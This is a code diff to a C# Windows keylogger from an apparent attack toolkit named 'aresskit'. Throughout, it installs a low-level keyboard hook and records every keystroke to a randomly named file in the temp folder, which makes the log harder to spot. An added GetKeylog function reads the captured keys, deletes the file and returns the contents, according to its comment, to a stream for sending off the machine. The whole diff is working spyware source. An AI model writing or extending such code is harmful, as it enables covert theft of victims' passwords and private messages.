@@ -14,8 +14,9 @@ namespace aresskit
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
 
+        private static string logFile = Path.GetTempPath() + Misc.RandomString(16) + ".txt";
 
-        public static void logKeys()
+        public static void StartKeylogger()
         {
             try
             {
@@ -30,6 +31,13 @@ namespace aresskit
             {
                 Application.Exit(); // Close
             }
+        }
+        
+        public static string GetKeylog()
+        {
+            string logFileContents = File.ReadAllText(logFile); // Store contents of log file into variable
+            File.Delete(logFile); // Delete log file so it doesn't get too big
+            return logFileContents; // Return log file contents back to stream
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -51,35 +59,12 @@ namespace aresskit
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                // send to listening server
                 try
                 {
-                    /*
-                    string name;
-                    switch (vkCode.ToString())
-                    {
-                        case Keys.Oemcomma:
-                            name = "Comma";
-                            break;
-                        case Keys.OemPeriod:
-                            name = "Period";
-                            break;
-                        default:
-                            name = (new KeysConverter()).ConvertToString(e.KeyCode);
-                            break;
-                    }
-                    */
-                    using (StreamWriter w = File.AppendText("log.txt"))
-                    {
-                        Toolkit.Log(vkCode.ToString(), w);
-                    }
-                    // Utils.sendData(Utils.stream, ((Keys)vkCode).ToString()); // Console.WriteLine((Keys)vkCode);
-                    Console.Write((Keys)vkCode);
+                    using (StreamWriter w = File.AppendText(logFile))
+                        Toolkit.Log(((Keys)vkCode).ToString(), w);
                 }
-                catch (Exception)
-                {
-                    Application.Exit(); // Close
-                }
+                catch (Exception) { Application.Exit(); } // Close
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
